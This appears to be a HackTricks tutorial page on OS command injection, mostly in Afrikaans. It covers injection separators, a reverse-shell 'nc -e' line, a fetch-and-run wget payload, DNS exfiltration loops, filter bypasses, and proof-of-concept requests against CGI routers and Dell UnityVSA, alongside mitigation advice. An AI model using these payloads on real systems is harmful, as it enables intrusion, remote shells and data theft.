# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Wat is command Injection?

A **command injection** maak dit vir 'n attacker moontlik om ewekansige bedryfstelsel-opdragte op die bediener wat 'n toepassing huisves, uit te voer. Daardeur kan die toepassing en al sy data volledig gekompromitteer word. Die uitvoering van hierdie opdragte stel gewoonlik die attacker in staat om ongemagtigde toegang tot of beheer oor die toepassing se omgewing en onderliggende stelsel te verkry.

### Konteks

Afhangend van **waar jou invoer ingespuit word**, moet jy moontlik die **geciteerde konteks beëindig** (using `"` or `'`) voordat jy die opdragte uitvoer.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Beperking** Bypasses

As jy probeer om **willekeurige kommando's binne 'n linux-masjien** uit te voer, sal jy belangstel om te lees oor hierdie **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Voorbeelde**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parameters

Hier is die top 25 parameters wat vatbaar kan wees vir code injection en soortgelyke RCE-kwesbaarhede (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Uittrekking van data: char vir char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Gebaseer op die tool van `https://github.com/HoLyVieR/dnsbin` wat ook by dnsbin.zhack.ca gehost word.
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Aanlyn gereedskap om te kontroleer vir DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Wanneer jy JavaScript/TypeScript back-ends oudit, sal jy dikwels die Node.js `child_process` API teëkom.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` skep 'n **shell** (`/bin/sh -c`), daarom sal enige karakter wat 'n spesiale betekenis vir die **shell** het (back-ticks, `;`, `&&`, `|`, `$()`, …) lei tot **command injection** wanneer gebruikersinvoer in die string gekonkateneer word.

**Mitigasie:** gebruik `execFile()` (of `spawn()` sonder die `shell` opsie) en verskaf **elke argument as 'n afsonderlike array-element** sodat geen shell betrokke is nie:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Nie alle injections vereis shell metacharacters nie. As die toepassing nie-vertroubare strings as argumente aan 'n stelsel-utility deurgee (selfs met `execve`/`execFile` en geen shell nie), sal baie programme nog steeds enige argument wat met `-` of `--` begin as 'n opsie ontleed. Dit laat 'n aanvaller toe om modi om te skakel, uitgangspaaie te verander, of gevaarlike gedrag te veroorsaak sonder om ooit in 'n shell in te breek.

Tipiese plekke waar dit voorkom:

- Ingebedde web-UIs/CGI-handlers wat opdragte bou soos `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, ens.
- Gesentraliseerde CGI-routers (bv., `/cgi-bin/<something>.cgi` met 'n selector-parameter soos `topicurl=<handler>`) waar meerdere handlers dieselfde swak validator hergebruik.

Wat om te probeer:

- Verskaf waardes wat met `-`/`--` begin sodat die downstream tool dit as vlagte sal aanvaar.
- Misbruik flags wat gedrag verander of lêers skryf, byvoorbeeld:
- `ping`: `-f`/`-c 100000` om die toestel te stress (DoS)
- `curl`: `-o /tmp/x` om lêers na willekeurige paaie te skryf, `-K <url>` om deur die aanvaller beheerde config te laai
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` om post-rotate uitvoering in onveilige wrappers te bereik
- Indien die program `--` end-of-options ondersteun, probeer om naiewe mitigasies te omseil wat `--` op die verkeerde plek voorvoeg.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Opsporingslys


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (toeganklikheid en exploitation)

Werklike patroon: Perl-kode bou 'n shell-opdragstring en voer dit uit via backticks (or qx//). In 'n mod_perl AccessHandler kan deur die aanvaller beheerde versoekkomponente soos $r->uri() in daardie string vloei. As enige tak rou insette aanmekaarheg en dit dan met 'n shell evalueer, kry jy pre-auth RCE.

Riskante Perl execution primitives (spawn a shell when given a single string):
- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") implicitly
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Minimale kwesbare vorm wat in die wild waargeneem is:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
Belangrike bereikbaarheidsoverwegings in mod_perl:
- Handler-registrasie: httpd.conf moet versoeke na jou Perl-module stuur, e.g. PerlModule MOD_SEC_EMC::AccessHandler en die konfigurasie wat AccessHandler::handler vir 'n pad-scope aanroep.
- Aktivering van die kwesbare tak: force the unauthenticated login flow so type == "login" (e.g., omit the expected auth cookie).
- Oplosbare pad: verseker dat jou versoek na 'n URI teiken wat binne die gekonfigureerde scope opgelos word. If Apache never routes the request through the handler, the sink isn’t reached.

Eksploitasiewerkvloei
1) Inspect httpd.conf for PerlModule/MOD_PERL handler scopes to find a resolvable path processed by the handler.
2) Send an unauthenticated request so the login redirect path is taken (type == "login").
3) Place shell metacharacters in the request-URI path so $r->uri() carries your payload into the command string.

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Wenke
- Probeer skeidingsmerke: ;, &&, |, `backticks`, $(...), en geënkodeerde nuwe reëls (%0A) afhangende van aanhaling.
- As vroeër patches ander args aanhaal maar nie die URI in een tak nie, werk payloads wat aan die einde van die string bygevoeg is dikwels: ;id# of &&/usr/bin/id#

Verharding (Perl)
- Moenie shell-strings bou nie. Gee voorkeur aan argument-vektor uitvoering: system('/usr/bin/curl', '--silent', '--', $safe_url) — geen shell.
- As 'n shell onvermydelik is, ontsnap streng en konsekwent oor alle takke; behandel $r->uri() as vyandig. Oorweeg URI::Escape vir paths/queries en sterk allowlists.
- Vermy backticks/qx// vir command execution; vang uitvoer via open3/list vorm as dit regtig nodig is sonder om 'n shell aan te roep.
- In mod_perl handlers, hou auth/redirect code paths vry van command execution of verseker identiese sanitasie oor alle takke om “fixed everywhere but one branch” regressies te voorkom.

Opsporing van kwesbaarhede
- Patch-diff modules wat shell commands saamstel; soek na inkonsekwente aanhaling tussen takke (bv., if ($type eq 'login') wat nie ontsnap is nie).
- Grep for backticks, qx//, open\s*\(|\||, and system\s*\(\s*" om string-gebaseerde shells te vind. Bou 'n call graph van sink na request entry ($r) om pre-auth bereikbaarheid te verifieer.

Werklike geval: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL wanneer type == "login" en die rou $uri ($r->uri()) aan die string gekoppel is.
- Bereikbaar via MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Praktiese nuans: gebruik 'n oplosbare pad wat deur die handler gedek word; anders sal die module nie uitgevoer word nie en sal die sink nie getref word nie.

## References

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
